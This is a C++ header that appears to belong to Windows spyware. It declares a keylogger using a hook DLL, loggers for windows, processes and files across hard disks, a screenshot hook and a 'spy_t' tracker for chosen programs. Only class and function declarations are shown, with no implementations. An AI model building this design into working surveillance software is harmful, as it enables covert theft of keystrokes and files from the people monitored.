
#pragma once
#include "stdafx.h"

namespace logger
{
	enum { KEYS, WINDOWS, PROCESSES, FILES };

	class keylogger_t
	{
	public:
		explicit keylogger_t(HWND wnd);
		~keylogger_t();

		void log(UINT code);
		void clear();
		void dump();
		void dump(const path & file);

		function<void()> make_screenshot;

	private:
		void load_dll();
		void init_dictionary();

		void push(wchar_t symbol);
		void pop();
		bool match();
		wstring get_line() const;

	private:
		deque<wchar_t> buffer;
		vector<wstring> dict;
		wstringstream data;

		function<int(HWND, UINT)> set_hook_handler;
		function<int()> release_hook_handler;
		HINSTANCE dll;
	};

	class logger_t
	{
	public:
		virtual void log() = 0;
		virtual void clear() { data.clear(); }
		virtual void dump() = 0;
		virtual void dump(const path & file) = 0;
		virtual void log_dump(const path & file) {};
		virtual vector<wstring> get_data() { return data; }

	protected:
		vector<wstring> data;
	};

	class windows_logger_t : public logger_t
	{
	public:
		explicit windows_logger_t(HWND wnd);
		virtual ~windows_logger_t();

		virtual void log() override;
		virtual void dump() override;
		virtual void dump(const path & file) override;
		virtual void log_dump(const path & file) override;

	private:
		HWND wnd;
	};

	class procs_logger_t : public logger_t
	{
	public:
		procs_logger_t();
		virtual ~procs_logger_t();

		virtual void log() override;
		virtual void dump() override;
		virtual void dump(const path & file) override;
		virtual void log_dump(const path & file) override;
	};

	class file_logger_t : public logger_t
	{
	public:
		file_logger_t();
		virtual ~file_logger_t();

		virtual void log() override;
		virtual void dump() override;
		virtual void dump(const path & file) override;
		void log_dump();
		void log(const vector<wstring> & ext);
		void log_files_dump(const vector<wstring> & ext);

	private:
		vector<path> get_hard_disks() const;
		void log_filesystem(bool only_folders, const vector<wstring> & ext);
	};

	typedef std::shared_ptr<keylogger_t> keylogger_ptr;
	typedef std::shared_ptr<windows_logger_t> windows_logger_ptr;
	typedef std::shared_ptr<procs_logger_t> procs_logger_ptr;
	typedef std::shared_ptr<file_logger_t> file_logger_ptr;

	extern vector<wstring> wnd_buffer;
	BOOL CALLBACK enum_windows(HWND wnd, LPARAM param);

	#define progfile L"prog.dat"

	class spy_t
	{
	public:
		spy_t();
		~spy_t();
		void init(HWND wnd);

		keylogger_ptr keyboard;
		windows_logger_ptr windows;
		procs_logger_ptr processes;
		file_logger_ptr files;

		function<void()> make_screenshot;

		class track_program
		{
		public:
			void add_process(const wstring & proc);
			void add_window(const wstring & wnd);
			void add_module(const wstring & module);

			void load();
			void save();
			void reset();
			void start_modules();

			vector<wstring> get_procs() const;
			vector<wstring> get_windows() const;
			vector<wstring> get_modules() const;

		private:
			friend class boost::serialization::access;
			template <class archive> void serialize(archive & ar, unsigned int version);

			vector<wstring> procs;
			vector<wstring> wnds;
			vector<wstring> modules;
			int timeout;
		} program;

	private:
		void tracking_loop();
		bool detected(const vector<wstring> & current, const vector<wstring> & tracked) const;
	};
}